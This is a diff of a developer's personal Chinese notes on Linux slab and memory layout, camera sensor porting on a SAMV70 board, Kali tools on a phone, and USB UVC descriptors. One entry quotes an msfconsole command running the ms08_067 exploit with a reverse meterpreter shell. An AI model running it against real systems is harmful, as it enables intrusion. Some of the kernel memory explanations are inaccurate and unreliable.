+				每个slab组上放置着多个 A结构数据对象
+				这些对象,标记为空闲的表示未使用,标记非空闲表示正在使用中.
+				当所有slab上的对象都被使用时,内核进程还继续需要新的结构数据时,就会通过伙伴系统继续分配内存来组建新的slab组
+			kmem_cache_alloc() 分配空闲结构数据对象 给进程使用,
+			kmem_cache_free() 回收不在使用的数据对象, 即不再使用的数据对象重新标记为空闲
+			kmem_cache_destroy 当所有A结构数据对象都不再使用时,可调用此销毁整个预备队,释放内存
+				依次扫描slabs_free链表上的slab. 首先对每个slab上的每个对象调用析构器函数，然后将slab的内存空间返回给伙伴系统.
+				释放用于per-CPU缓存的内存空间。
+				从cache_cache链表移除相关数据。
+	
+			补充:
+			struct kmem_cache 中有多个 array_cache 内容是指向cpu的,有多少个cpu就有多少个array_cache
+			array_cache 是指向 cpu 的高速缓存的,
+			即如果有些需要使用的结构数据对象 要求对象是在 cpu_cache(即高速缓存)时,跟array_cache的内容就有关系了
+		kmalloc: 分配内存给结构数据时,
+			如果检测到是常用的结构数据时,就会选择使用slab分配
+			然后如果发现没有对应的预备队,就会建一个 kmem_cache_create()
+			然后 kmem_cache_alloc() 分配出一个对象来供使用
+		kfree: 释放一个结构数据
+			如果检测到预备队里的 数据对象, 就kmem_cache_free() 标记空闲并归还给预备队
+memory深入学习:(用户进程的用户态内存分配管理)
+	每个用户进程都有自己的用户态空间和内核空间,对于32机器说共4gb,其中3gb用户空间和1gb用户空间!!
+	其实,用户进程的用户态进程部分和内核态部分应该算作是两个独立的进程,都参与调度!!但是他们比较特别,共用一个PID!!
+		如果是内核态部分在运作时,用户态部分永远在沉睡,进程调度永远不会调到这个对应的用户态部分,除非内核态部分完成并唤醒用户态部分!!!
+		相反谈论,同样道理
+	用户态部分有自己的3g内存空间, 内核态部分,则和所有内核进程共用1g空间.
+		用户态部分有自己的3g内存空间, 指每个用户进程用户态部分都有自己页表映射到物理内存,
+		内核态部分共用1g空间,指用户进程内核态部分都共用一张页表.
+	一个用户进程的用户态地址空间主要由两个数据结来描述:
+		mm_struct:
+			最高层次的mm_struct结构描述了一个用户态部分的进程的整个虚拟地址空间。每个用户进程只有一个mm_struct结构,
+			在每个用户进程的task_struct结构中, 有一个指向该进程的结构,
+			成员有页表位置,栈,堆,参数变量,系统变量,等等的位置
+			mm_struct 这个数据对象是放在内核态内存区的,虽然他是用来描述一个用户进程用户态部分的内存结构
+		vm_area_structs
+			较高层次的结构vm_area_truct描述了用户态虚拟地址空间的一个区间(简称虚拟区).
+			一般的虚拟区有:
+				当前运行代码的二进制代码. 该代码通常称之为text,所处的虚拟内存区域称之为代码段(text section).
+				可执行文件的已初始化全局变量的内存映射, 称为数据段(data section).
+				包括未初始化全局变量(也就是bss段的零页)的内存映射， 页面中的信息全部为0值, 所以可用于映射bss段等目的.
+				用于保存局部变量和实现函数/过程调用栈(不要和进程内核栈混淆, 进程的内核栈独立存在并由内核维护)的零页内存映射
+				程序使用的动态库的代码, 诸如C库或动态连接程序等共享库的代码段, 数据段和bss段.
+				存储动态产生的数据的堆
+				环境变量和命令行参数的段.
+				将文件内容映射到虚拟地址空间中的内存映射
+	建立布局(建立用户进程和内核进程均适用):
+		当fork一个新进程后,执行exec 把一个新程序替换原有的程序时,就出现加载程序文件的操作
+		会使用load_elf_binary装载一个ELF二进制程序文件,装嵌的工程中需要对进程的各种空间重新布局适应新程序
+		重新布局的工作有:
+			arch_pick_mmap_layout 根据实际情况选择布局样式,例如根据 legacy_va_layout 指示
+			如何选择内存映射的基地址, 该工作由mmap_base来完成
+		回到load_elf_binary. 该函数最后需要在适当的位置创建栈
+
+
+
+
+
+201708011
+m7板子samv70移植ov7725
+ov7725的一些内容:
+	i2c: 0x42 for write, 0x43 for read
+	未知数据输出开关: com3 bit0  ??  com11 bit1  HREF bit3   ??  com2 bit4  ??
+		         HSTART~VSIZE(这里是定的是采集的图片大小,与输出开关无关)
+		         com10 bit1(重点,这里似乎是设置vsync有效的极性)
+	由于不知道图片传输的信号开关,所以试图 从采集图片开始分析!! (还没开始分析)
+同样m7板子same70_xplaint移植 摄像头
+	烧录环境搭建: 
+		iar jlink不行, 但是sam-ba可以通过j-link烧录!
+		注意编译前 linker文件选flash的,不是sram的
+	测试:
+		使用ov2640 ,居然不能读出型号寄存器的值,但i2c完好工作!
+		流数据并口连接: ISI_D0~D7 接seneor D2~D9
+		卧槽,更奇葩的来了:烧录了程序后,先开发完全断电!!!然后插上usb,然后打开软件就可以看到了视频流!!!!
+		但是如果在非掉电的情况下,reset 后, 就会出现读取芯片的寄存器失败!!!!
+			原因是,一上电后sensor芯片其实一直在做视频流输出的工作,不管有没有打开了视频软件,
+			当我们非掉电reset时,sensor其实并没有reset到,反而因为突然的输入xclk断开了而出现一些混乱,
+			整体说sensor已经跑飞了!!!!需要reset,但是开发板的reset没有reset到sensor!!1
+			证明:当我在开发板非掉电reset前拔掉sensor的3.3v针,非掉电reset后插上, 就成功启动了!!
+		所以试图软件reset sensor,(sensor虽然跑飞,但是i2c模块还是正常工作的,通过i2c传输软reset到指定寄存器)
+			1,例如操作pwdn 但是后来发现买回来的ov2640模块的pwdn实际上是notconnect的,
+			  任我m7芯片怎么操作 PIO_Set/PIO_Clear pwdn针也没有用!!!
+			2,尝试操作reset寄存器,注意reset寄存器有多个,易混淆,注意是 sensor控制区的com7寄存器的bit7 而不是其他!!
+			  成功!!! 
+			  即以后 非掉电reset时,seneor也会得到reset!!! 从而可以正常启动!!!!!
+			  相关重点代码:
+				//by william
+				const sensorReg_t ov2640rst[] = {
+					{0xFF, 0x01},	//选sensor块
+					{0x12, 0x80},	//com7 bit7 reset
+				        {0x0E, 0x11},	//0x0e是一个无作为的寄存器,通过给无作为寄存器写内容达到延时作用!!!!
+				        {0x0E, 0x11},
+				        {0x0E, 0x11},
+				        {0x0E, 0x11},
+				        {0x0E, 0x11},
+				        {0x0E, 0x11},
+				        {0x0E, 0x11},
+				        {0x0E, 0x11},
+				        {0x0E, 0x11},
+				        {0x0E, 0x11},
+				        {0x0E, 0x11},
+				        {0x0E, 0x11},
+					{0xFF, 0xFF}
+				};
+			        //by william ov2460 reset
+			        sensor_twi_write_regs (&twid, ov2640rst);
+				//注意 sendorStatus_t sensor_twi_write_regs(Twid *pTwid, const sensorReg_t *pReglist)
+				//还有 Twid twid;
+开始移植 ov7725:
+	The device slave addresses are 0x42 for write and 0x43 for read  即7位地址为0x21
+	ov7725的芯片跑不过来处理i2c传来的内容,所以每次i2c通讯之间需要加延时!!!!设置时 原子读过程中,写地址,和读数据间都要延时!!!
+	但是秉火的可以通讯,秉火的是12mhz运转时钟的
+	跟商家换了个模块 可以i2c通讯了 也有vs hf pck d0-d7 的信号输出了,但上位机软件就是没有图像
+	换了商家的代码,终于有视频流了!!! 但是图像色彩翻转,原来是用了RGB格式, 应该换成yuv格式
+	0x12,0x40 换成了yuv格式 还是色彩颠倒!!!
+	怀疑是数据流传输格式问题.
+		更改:UV swap (works with register COM3[4] (0x0C)and DSP_Ctrl3[7](0x66))
+		{COM3[4], DSP_Ctrl3[7]}	= 10: U0Y0, V1Y1, U2Y2, V3Y3, ...
+		成功显示!!!
+	从QVGA(320x240) 转到 VGA(640x480)
+		main,ov7725 该做成vga的也该了,而且摄像头也变慢了,应该是摄像头设置为vga成功了,
+		但是还是出来 320x240 的图,demo说过由于空间问题,所以demo只输出qvga的视频流,所以还有某个与usb交互的地方固死了参数!!
+		怀疑 viddprobedata 里的 bframeIndex 应该为 2 !!  也不对
+		找到了frmW, frmH的初次声明给定值,设为 640,480 出错了,居然黑屏了,但是手动调到640x480后,可以工作!!!
+		但是出现断帧的情况!!!首先设置帧速率30f/s 这个跟设置uvc 的帧速率有关
+		但是怎么调试还是出现断帧的情况!! 就是第一次打开摄像头没事,后面打开时就断帧了,
+		另外:软件打开时不能默认视频流是vga 后面发现:
+			VS Format Uncompressed 的 Payload uncompressed format 的 default frameformat选了1(QVGA)的,应该选2(vga)
+			此外,不要忘记手动设frmW, frmH的初次声明给定值,设为 640,480,不然没有图像出来!!
+			还有,开发板给 sensor 的工作时钟改回 25mhz
+		怀疑是mck速度跟不上,或者是buffer不够大!!
+		修改: ISI_MAX_PREV_BUFFER
+		      viddProbeData -> FRAME_INTERVALC,FRAME_PACKET_SIZE_HS 
+		      没有用
+		本来找最终原因的,但是还是算了,直接在再次开启前重新初始化就是了
+		就是在 if(bVidON && !bVideoON) 段最后添加:
+			_isiinit()
+			_ConfigureTc()
+			成功显示,不在出现 多次重开上位机也不再出现断帧现象
+			初步怀疑是 timer counter 的问题!!
+	建立UVC命令:		
+		还有,怀疑 getcur setcur 根本什么都没有工作过, 所以viddProbeData()似乎么有被修改过, frmW,frmH也没有被改过!!
+		怀疑所有 getcur 都NAK回应, 而setcur是工作的!! 注意 probedata过程中并未被改动过,所以 
+		添加 trace_debug !! USBLib_Trace.h 添加define!!
+		_isiinit里的setinputstream为啥设的是 RGB_INPUT??不是说好是YUV的吗?
+			哲理有好多预置,比如sensor采样窗口大小,输出图片流的窗口大小,sensor图片流格式RGB
+	m7开发板,去外在sram:
+		通过isi_DMA 寄存器分析 isi工作原理, 
+			isiDMA有两种,一种是previeW的即采集的原始数据DMA,另一种把原始数据编码处理后再缓存的DMA
+			我们就 原始数据DMA举例说明:
+			首先这种DMA框架有两个地址寄存器 descriptor 和 buffer 
+			descriptor 放的是 descriptor数组结构对象A的地址
+			buffer 放的是帧缓存首地址A
+			一个descriptor数组结构对象有3个成员,缓存地址A,控制数据A,指向下一个descriptor数组结构对象B的指针
+			首先,把一个 descriptorA 和 bufferA 的地址 放到对应寄存器, 开启服务
+			isi传来的字节刘数据,会存到 buffer寄存器指向的寄存器,然后bufer寄存器自动加1指向下一字节,继续接收数据
+			直到收到了一个帧的数据,然后在isi发生中断的同时,
+			isi模块自动把 descriptor寄存器 指向的数组对象A 第三个成员(下一个descriptor数组对象B的指针)放入descriptor寄存器
+			然后再把 descriptorB 的第一个成员 bufferB的地址 放入 buffer寄存器
+			就这样准备好接收下一帧数据,由于这种机构,帧缓存列表满了后,可以回过来重新覆写
+			isiDMA框架接收数据是独立于cpu执行的.所以不管cpu在干什么,isi都只顾自己源源不断,并不停歇地接收一帧帧的数据
+			每传输好一帧就,标记一次flag,但是isi本身不会等待flag被消除后才重新执行下一帧的接收
+			就是说不管flag有没有被clear,每帧接收完后都会例行set一次flag!! 
+			最后关于手动写入地址寄存器的数据 都是 word对齐的,即32位,4个字节对齐,
+			虽然4字节对齐,但因为一帧vga_yuv至少达600kb,是4字节的倍数,所以符合4字节对齐,并没有问题
+		不能指望通过isi来传输图片!!因为没有留出dma接口,没有其他接口提供
+		那么就剩下利用菜谱主频来获取数据,但是占据大部分cpu频率,使得cpu无法干其他事情!!!
+	发现gray模式一帧300kb, 可以尝试使用gray模式试试!!!!
+		grayscale太奇葩了,sensor是vga采集的格式的,但是经过isi后,原始vga数据被直接阉割成 QVGA 卧槽,做不下去了!!
+		还有usb数据流 断帧的问题!!
+			假如重福发同一sram位置的同一帧的数据就没有问题!!,但是一旦改变着sram位置发数据时,就出现断帧情况
+		注意.ISI_setPreviewSize 和 ISI_SetSensorSize 在 设置gray模式中非常诡异!!! 是vga变QVGA的元凶!!
+		现在停在 ISI_setPreviewSize 和 ISI_SetSensorSize 的探究!!!
+		重新分析 isi grayscale 的初始化!!!
+		灰阶的 真的硬生生把 VGA 割回 qvga 的分辨率!!!
+		怀疑 GS_MODE GRAYSCALE 的问题, 
+			发现demo 没有可以设置 GS_MODE GRAYSCALE 
+			手动设置后出问题!! 查看pdf 8-bit gray模式发现: 要求 clear GRAYSCALE !! 
+			但demo isi_setGrayscaleMode()预示要设 GS_MODE 先set GRAYSCALE 为 1
+			手动 单设 GS_MODE 并任何正负面作用,可以说明 GS_MODE 配合 GRAYSCALE =1 才有用
+		pdf 8-bit gray模式 告诉使用 8-bit gray模式 要用 codec_channel, 使用codec_channnel后 发现没有!!!
+		pdf 8-bit gray模式 只是注明 ISI_CFG2->IM_HSIZE 要 640/2-1,而ISI_PSIZE->PREV_HSIZE并没有这样说!!
+			但是 ISI_PSIZE->PREV_HSIZE 不设成640/2-1, 而是 640-1 时, isi模块工作出错!!
+		使用codec_channel 并且, ISI_PSIZE->PREV_HSIZE 设成 640-1 时, isi模块工作继续出错!!
+		gray-demo的isi默认设置是 ISI_CFG2:0000 0001 0011 1111 1001 0001 1101 1111
+			0-10 bit: 001 1101 1111 = VSIZE = 479
+			11 bit: 0 -> 2 pixel gray
+			12 bit: 1 -> RGB_MODE->RGB565
+			13 bit: 0 -> GRAYSCALE -> disable (这里的GRAYSCALE指的是12位的grayscale)
+			14 bit: 0 -> RGB_SWAP -> D7-R7
+			15 bit: 1 -> COLOR_SAPCE-> RGB
+			16-26 bit: 001 0011 1111 = HSIZE =319
+			28-29 bit: 00 -> YCC_SWAP -> byte0-Cb,byte1-Y,byte2-Cr,byte3-Y...
+			30-31 bit: 00 -> RGB_CFG -> byte0-R/G(MSB),byte1-G(LSB)/B,byte2-R/G(MSB),byte3-G(LSB)/B ....
+		对比彩色demo 的isi默认设置 ISI_CFG2: 0110 0010 0111 1111 1001 0001 1101 1111
+			0-10 bit: 001 1101 1111 = VSIZE = 479
+			11 bit: 0 -> 2 pixel gray
+			12 bit: 1 -> RGB_MODE->RGB565
+			13 bit: 0 -> GRAYSCALE -> disable (这里的GRAYSCALE指的是12位的grayscale)
+			14 bit: 0 -> RGB_SWAP -> D7-R7
+			15 bit: 1 -> COLOR_SAPCE-> RGB
+			16-26 bit: 010 0111 1111 = HSIZE =639
+			28-29 bit: 10 -> YCC_SWAP -> byte0-Y,byte1-Cb,byte2-Y,byte3-Cr...
+			30-31 bit: 01 -> RGB_CFG -> byte0-B/G(MSB),byte1-G(LSB)/R,byte2-B/G(MSB),byte3-G(LSB)/R ....
+		新假设: isi 8-bit 灰度 把每个采集的字节都当成 Y ,所以把sensor传来的 U,V 都当成了Y!!
+			那就尝试把 ov7725 sensor 输出 改成 YYYYY 的输出!!
+			ov7725 开灰度图模式,先要 开SDE 0x64 bit5
+			0x26 允许 grayscale 输出黑白灰度!! 但是也是 YUV输出 没有只是Y输出
+			0x26 允许 U,固定值,0x60,0x61,填写俩个强制的值,比如说 0x80
+				那么u,v的输出就会变成强制值0x80, 从而得到, uv值为不同强制值后,得到不同色系的灰度图 
+20170815
+使用GNUroot dbian:
+手机装kali 工具: 
+	https://github.com/LionSec/katoolin/issues?page=3&q=is%3Aissue+is%3Aopen
+	https://mp.weixin.qq.com/s/Safyp-WpK6OzyvJbaHmJOA
+	问题1:
+	katoolin unable to locate package:未解,虽然尝试改 sources.list
+	相关sources.list内容	
+	deb http://http.kali.org/kali kali-rolling main contrib non-free
+	# For source package access, uncomment the following line
+	# deb-src http://http.kali.org/kali kali-rolling main contrib non-free
+	deb http://http.kali.org/kali sana main non-free contrib
+	deb http://security.kali.org/kali-security sana/updates main contrib non-free
+	# For source package access, uncomment the following line
+	# deb-src http://http.kali.org/kali sana main non-free contrib
+	# deb-src http://security.kali.org/kali-security sana/updates main contrib non-free
+	deb http://old.kali.org/kali moto main non-free contrib
+	# For source package access, uncomment the following line
+	# deb-src http://old.kali.org/kali moto main non-free contrib
+手机装 metaspoilt 工具: 
+	msfinstall perssion deny 怀疑缺库!!!!
+	ldd msfinstall 不能查看依赖库,怀疑执行文件不是符合 armhf 硬件框架 
+	最终发现是 chmod 没有起作用!!!,所以唉,什么都做不了
+	不用傻瓜方法,先试试github方法!!
+	rm -r metaspoilt 	//把原来的metaspoilt项目文件夹档案全删除!!	
+	//不行,取不到chmod的权限,就不能正常使用.sh文件
+	
+装桌面 Xserver
+	先 google play 安装个XServer XSDL 框架
+	然后GNUboot:
+		apt-get grade	//本想更新一下库的,居然搞出个大libc6兼容的问题出来!!!
+		apt-get install lxde		
+		卧槽,出错了: 之前的upgrade 把libc6弄乱了,现在都出这么一句 libc-bin: depends: xxxx is installed 之类
+		仅仅 apt-get -f install 未能修复上述问题
+		原因是从kali-rolling 那更新了 libc-dev-bin  libc6-dev 但唯独就是更新libc6 时失败了!!!!
+		而因为后面操作 libc-dev-bin  libc6-dev 需要高版本的 libc6,由于libc6版本每更新所以失败!!!!
+		之前upgrade时,libc6 half-install了,
+		解决(重装libc6旧版本): 
+				先sources.list把 kali-rolling 数据源去掉!!,然后
+				apt-get autoclean
+				apt-get update
+				apt-get upgrade 
+				apt-get install --reinstall libc6=2.19-18+deb8u10  //关键 重装旧版本libc6 
+		至此搞定了 libc6 兼容问题,开始今天的主题:安装lxde桌面环境到手机上!!!
+		apt-get install auto-apt  //先装auto-apt工具,因为,安装lxde需要各种依赖包,但是命令 apt-get install lxde 不会自动安装依赖包
+		auto-apt run apt-get install lxde     //命令格式 auto-apt run [command]	这样就可以自动把依赖包都加上!!!
+		然后 至少给装上一个图形界面的终端 Xterm apt-get install xterm
+		然后打开 XServer XSDL 查看最后蓝屏指导的命令行
+		然后在 GNUboot 上输入添加蓝屏全局变量的命令: export DISPLAY:=0 PLUSE_SERVER=top:127.0.0.1:4712
+		然后在 GNUboot 执行: startlxde &
+		回到 XServer XSDL 就进入了桌面系统了!
+		
+
+
+
+
+
+
+20170823
+metasploit
+	metasploit 是一个 工具框架,打开 metasploit-framework 或者终端输入 msfconsole后,便转到专门的msf终端, msf>
+	armitage是metasploit的图形交互版本,使用armitage前 先打开 metasploit-framework
+	msf的shell 命令 : 一般说,进入msf终端 手动执行msf命令,不实际,现实更趋向打包msf命令成一个shell命令,写入shell脚本执行例如:
+	./msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set RHOST [IP]; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST [IP]; run; exit"  	//这里 -x 参数就是一参数表示:打包msf命令成一个shell命令,然后执行!!
+	metasploitable 是一个靶机系统,各种公开的漏洞可供使用!!!
+
+
+
+
+
+
+
+
+20170824
+继续m7 板子添加uvc指令!!!	
+加led灯!!
+一个完整的uvc configuration 拓扑结构,以下是一个拓扑结构例子,一个拓扑结构有先后顺序地包含多个 descriptor
+	
+	一个uvc configuration_A 分先后次序包含以下多个descriptor: (**号标记的是要重点理解的项)
+	/* configuration descriptor */
+		bLength		0x09	//这个descriptor长度(包括bLength) 这里占9字节
+		bDescriptorType	0x02	//descriptor 的标记,0x02 表明这个是 configuration 的 descriptor
+					//这个descriptor一定在众多 descriptor 之首
+					//也表明接下来的 接收到的 descriptor 同属这一个 uvc configuration_A 拓扑结构的内容
+		wTotalLength	??	//指整个uvc configuration_A 所有内容所占总字节数,即所有descriptor所占据字节的总和
+		bNumInterfaces	0x02	//interface接口数 2个
+		bConfigurationValue 0x01//指 uvc configuration_A 的编号 这里编号是 1 
+		iConfiguration		//空置,没有用处
+		bmAttributes	0x80	//usb 设备特性, 自供电, 不接受远程唤醒
+		bMaxPower	??	//usb bus电流大小 这里设了最大 100ma
+	/* Interface Association Descriptor (IAD) */
+		bLength		0x08	//这个descriptor长度(包括bLength) 这里占8字节
+		bDescriptorType	0x0b	//descriptor 的标记,0x0b 表明这个是 Interface Association 的 descriptor
+		bFirstInterface 0x00	//控制接口,也是第一个要使用的接口 我们分配 0号接口为这个接口
+		bInterfaceCount	0x02	//这个uvc configuration_A分配的 interface接口数 2个
+		bFunctionClass	0x0e	//表示这个IAD 分到的 class是:video interface class code (CC_video)   
+		bFunctionSubClass 0x03	//表示这个IAD 分到 CC_video 的 SC_VIDEO_INTERFACE_COLLECTION subclass里
+		bFunctionProtocol 0x00	//空置,没有用到,必须设为 0x0 表示PC_PROTOCOL_UNDEFINED
+		iFunction	0	//这是id,指向对应id的 string descriptor,这个被指的descriptor会有些备注字符串信息, id=0表示没有指向
+		//这个descriptor可以说是一个 视频类接口的集合器
+	/* VideoControl Interface Descriptor  (VC)*/
+		bLength		0x09	//这个descriptor长度(包括bLength) 这里占9字节		
+		bDescriptorType	0x04	//descriptor 的标记,0x04 表明这个是 INTERFACE接口 的 descriptor
+		bInterfaceNumber 0x0    //这个接口的id是0, 也就是上面IAD->bFirstInterface 指向的接口
+	**	bAlternateSetting 0x0	//这个 VideoControl Interface Descriptor 的 归类到 id=0 的Alternatesetting 里的一个子项
+	**	bNumEndpoints	0	//这个接口使用多少端口, 这里使用0个,虽然会使用到端口0,但端口0不算入这个统计里,所以是0个
+		bInterfaceClass 0x0e	//表示接口 到的 class 是 CC_video ,接口属于 视频类
+		bInterfaceSubClass 0x01	//表示接口 分到 CC_video 的 SC_VIDEOCONTROL subclass里, 接口是视频类的控制类
+					//即这是一个视频控制接口!!
+	**	bInterfaceProtocol 0x0  //空置,没有用到,必须设为 0x0 表示PC_PROTOCOL_UNDEFINED
+		iInterface	0	//id=0表示没有指向对应 string descriptor, 没有附加的备注信息
+		//以下几个descriptor是紧接这个descriptor的!!进一步描述 视频控制接口
+	/* Class-specific Interface header Descriptor about VC */
+		bLength		0x0e	//这个descriptor长度(包括bLength) 这里占13字节	
+		bDescriptorType 0x24	//descriptor 的标记,0x24 表明这个是 CS_INTERFACE (Class-specific Interface) 接口类 descriptor
+		bDescriptorSubType 0x01	//descriptor 的子标记,0x01表明是 接口类 的 VC_header descriptor
+	**	bcdUVC 		0x0110	//表示 videocontrol 符合 uvc 1.1 标准 
+		wTotalLength	??	//整个 videocontrol interface class 内容的所占总字节数,即整个SC_VIDEOCONTROL子类具体内容所占总字节数
+					//包括:
+					//	当前的 header descriptor,
+					//	Input Terminal Descriptor about Camera ,
+					//	Output Terminal Descriptor,
+		dwClockFrequency ??	//uvc 设备运转时间,这里是 123mhz
+		bInCollection	1	//有多少个 流接口,(streaming interface) 这里有1个
+		baInterfaceNr(1)  1	//VideoStreaming interface 1 归这个 VideoControl Interface 管
+	/* Class-specific Input Terminal Descriptor about Camera */	camera为源的输入终端
+		bLength		0x12	//这个descriptor长度(包括bLength) 这里占18字节	
+		bDescriptorType 0x24	//descriptor 的标记,0x24 表明这个是 CS_INTERFACE 接口类 descriptor
+		bDescriptorSubtype 0x02	//descriptor 的子标记 0x02 ->VC_INPUT_TERMINAl 这是视频控制接口 的 输入控制端模块
+	**	bTerminalID 	0x01	//这个模块 的 id为 1
+		wTerminalType	0x0201	//表示是输入控制端模块 控制的是 camera输入	(ITT_CAMERA)
+		bAssocTerminal	0	//No association 不知道干什么用的
+		iTerminal	0	//id=0表示没有指向对应 string descriptor, 没有附加的备注信息
+		wObjectiveFocalLengthMin 0 //No optical zoom supported 不知道干什么用的
+		wObjectiveFocalLengthMax 0 //No optical zoom supported 不知道干什么用的
+		wOcularFocalLength 0	//No optical zoom supported 不知道干什么用的
+		bControlSize	3	//The size of the bmControls is 3 bytes
+		bmControls    0x000000	//No controls are supported
+	/* Class-specific Output Terminal Descriptor */ 输出终端
+		bLength		0x9	//这个descriptor长度(包括bLength) 这里占9字节	
+		bDescriptorType 0x24	//descriptor 的标记,0x24 表明这个是 CS_INTERFACE 接口类 descriptor
+		bDescriptorSubtype 0x03	//descriptor 的子标记 0x02 ->VC_OUTPUT_TERMINAl 这是视频控制接口 的 输出控制端模块
+	**	bTerminalID 	0x02	//这个模块 的 id为 2	
+		wTerminalType	0x0101	///表示是输出控制端模块 控制的是 usb streaming输出 (TT_STREAMING)
+		bAssocTerminal	0	//No association 不知道干什么用的
+	**	bSourceID	1	//表示这个 输出模块的 输入源是 id=1的模块,即 上面的 camera input terminal 模块
+		iTerminal	0	//id=0表示没有指向对应 string descriptor, 没有附加的备注信息
+		//至此 VideoControl Interface (视频控制接口)的内容都由
+		//	VideoControl Interface Descriptor
+		//	|-Class-specific Interface header Descriptor about VC
+		//	|-Class-specific Input Terminal Descriptor about Camera 
+		//	|-Class-specific Output Terminal Descriptor
+		//这几个 descriptor 描述完毕
+		//当中,这里应该还有一个pu模块,然后才可以使用 uvc 命令,后面再处理!!
+	/* VideoStreaming Interface Descriptor (VS) */
+		bLength		0x9	//这个descriptor长度(包括bLength) 这里占9字节			
+		bDescriptorType	0x04	//descriptor 的标记,0x04 表明这个是 INTERFACE接口 的 descriptor
+	**	bInterfaceNumber 0x01	//这个接口的id是1,也是 上述 VC header->baInterfaceNr(1)中指向的 接口id
+	**	bAlternateSetting 0x0	//这个 VideoStreaming Interface Descriptor 的 也归类到 id=0 的Alternatesetting 里的一个子项
+*********	bNumEndpoints	0	//这个接口使用多少端口, 这里使用0个,既然要输出数据应该有个非0端口吧,为什么说没有???重点!!!
+		bInterfaceClass 0x0e	//表示接口 到的 class 是 CC_video ,接口属于 视频类
+		bInterfaceSubClass 0x02	//表示接口 分到 CC_video 的 SC_VIDEOSTREAMING subclass里, 接口是视频类的视频流子类
+					//即这是一个视频控制接口!!
+	**	bInterfaceProtocol 0x0  //空置,没有用到,必须设为 0x0 表示PC_PROTOCOL_UNDEFINED
+		iInterface	0	//id=0表示没有指向对应 string descriptor, 没有附加的备注信息
+	/* Class-specific Interface header Descriptor about VS */
+		bLength		0x0e	//这个descriptor长度(包括bLength) 这里占13字节	
+		bDescriptorType 0x24	//descriptor 的标记,0x24 表明这个是 CS_INTERFACE (Class-specific Interface) 接口类 descriptor
+*********	bDescriptorSubType 0x01	//descriptor 的子标记,0x01表明是 接口类 的 VS_input_header descriptor	???
+	**	bNumFormats 	0x01	//有 1 个视频流格式 format descriptor  
+		wTotalLength	??	//整个 videocontrol interface class 内容的所占总字节数,即整个SC_VIDEOCONTROL子类具体内容所占总字节数
+					//包括:
+					//	当前的 header descriptor,
+					//	,
+					//	,
+*********	bEndpointAddress ox80	//用于实时传输流数据的 端点的id=0x82,为啥demo上是0x80,有这个非零端点,为啥上面说没有endpoints?
+		bmInfo			//No dynamic format change supported
+		bTerminalLink	2	//VideoStreaming interface 要连到 模块id=2的 output terminal 
+		bStillCaptureMethod 0   //0 means -- still image capture method not support
+		bTriggerSupport		//not support trigger
+		bTriggerUsage	0	//no Trigger Usage
+		bControlSize	1	//The size of the bmControls is 1 bytes
+		bmControls    	0x00	//No No VideoStreaming specific controls are supported
+	/* Class-specific VS Format Descriptor */
+		bLength		??	//这个descriptor长度(包括bLength) 这里占??字节	
+		bDescriptorType 0x24	//descriptor 的标记,0x24 表明这个是 CS_INTERFACE (Class-specific Interface) 接口类 descriptor
+		bDescriptorSubtype 0x04	//descriptor 的子标记,0x04 表明是VS_FORMAT_uncompressed 即原始格式视频流
+		bFormatIndex	0x01	//这个format id=1
+		bNumFrameDescriptors 3  //这个format 有三种frame格式,即有三种 frame descriptor
+		guidFormat	??	//guid yuy2 的编码,不知道是啥,但是因为是 VS_FORMAT_uncompressed 所以有这个成员
+		bBitsPerPixel	16	//16bit perpixel 也是因为是 VS_FORMAT_uncompressed 的关系
+		bDefaultFrameIndex 2	//默认使用哪个frame_2格式
+		bAspectRatioX	0	// Non-interlaced stream – not required
+		bAspectRatioY	0	// Non-interlaced stream – not required
+		bmInterlaceFlags 0	// Non-interlaced stream
+		bCopyProtect	0	//No restrictions imposed on the duplication of this video stream.
+	/* Class-specific VS Frame Descriptor 320x240 */
+		bLength		??	//这个descriptor长度(包括bLength) 这里占??字节			
+		bDescriptorType 0x24	//descriptor 的标记,0x24 表明这个是 CS_INTERFACE (Class-specific Interface) 接口类 descriptor
+		bDescriptorSubtype 0x05	//descriptor 的子标记,0x04 表明是VS_FRAME_uncompressed 即原始格式视频流		
+		bFormatIndex	0x01	//这个frame id=1
+		bmCapabilities 0	//Still images using capture method not supported
+		wWidth		320	//帧宽
+		wHeight		240	//帧高
+		dwMinBitRate	320*240*2*12    //视频流传输时,最小传输字节率 12张图片/s的字节率
+		dwMaxBitRate	320*240*2*30  	//视频流传输时,最大传输字节率 30张图片/s的字节率
+		dwMaxVideoFrameBufSize  320*240*2	//最大视频流缓存,一帧图片大小的数据的缓存
+		dwDefaultFrameInterval	0x000A2C2A	//默认帧与帧间的传输间隔: 0x000A2C2A=666666ns 即约莫15帧每秒
+		bFrameIntervalType	1	//从多个传输间隔中选取一个使用,这里选用dwFrameInterval[] 中第一个帧与帧间的传输间隔 ,
+		dwFrameInterval[]	0x000A2C2A,0x000A2C25 ....	//FrameInterval数值列,列出多个可用传输间隔!!
+	/* Class-specific VS Frame Descriptor 640x480 */
+		bLength		??	//这个descriptor长度(包括bLength) 这里占??字节			
+		bDescriptorType 0x24	//descriptor 的标记,0x24 表明这个是 CS_INTERFACE (Class-specific Interface) 接口类 descriptor
+		bDescriptorSubtype 0x05	//descriptor 的子标记,0x04 表明是VS_FRAME_uncompressed 即原始格式视频流		
+		bFormatIndex	0x02	//这个frame id=2
+		bmCapabilities 0	//Still images using capture method not supported
+		wWidth		640	//帧宽
+		wHeight		480	//帧高
+		dwMinBitRate	640*480*2*12    //视频流传输时,最小传输字节率 12张图片/s的字节率
+		dwMaxBitRate	640*480*2*30  	//视频流传输时,最大传输字节率 30张图片/s的字节率
+		dwMaxVideoFrameBufSize  640*480*2	//最大视频流缓存,一帧图片大小的数据的缓存
+		dwDefaultFrameInterval	0x000A2C2A	//默认帧与帧间的传输间隔: 0x000A2C2A=666666ns 即约莫15帧每秒
+		bFrameIntervalType	1	//从多个传输间隔中选取一个使用,这里选用dwFrameInterval[] 中第一个帧与帧间的传输间隔 ,
+		dwFrameInterval[]	0x000A2C2A,0x000A2C25 ....	//FrameInterval数值列,列出多个可用传输间隔!!		
+	/* Class-specific VS Frame Descriptor 176x144 */
+		bLength		??	//这个descriptor长度(包括bLength) 这里占??字节			
+		bDescriptorType 0x24	//descriptor 的标记,0x24 表明这个是 CS_INTERFACE (Class-specific Interface) 接口类 descriptor
+		bDescriptorSubtype 0x05	//descriptor 的子标记,0x04 表明是VS_FRAME_uncompressed 即原始格式视频流		
+		bFormatIndex	0x03	//这个frame id=3
+		bmCapabilities 0	//Still images using capture method not supported
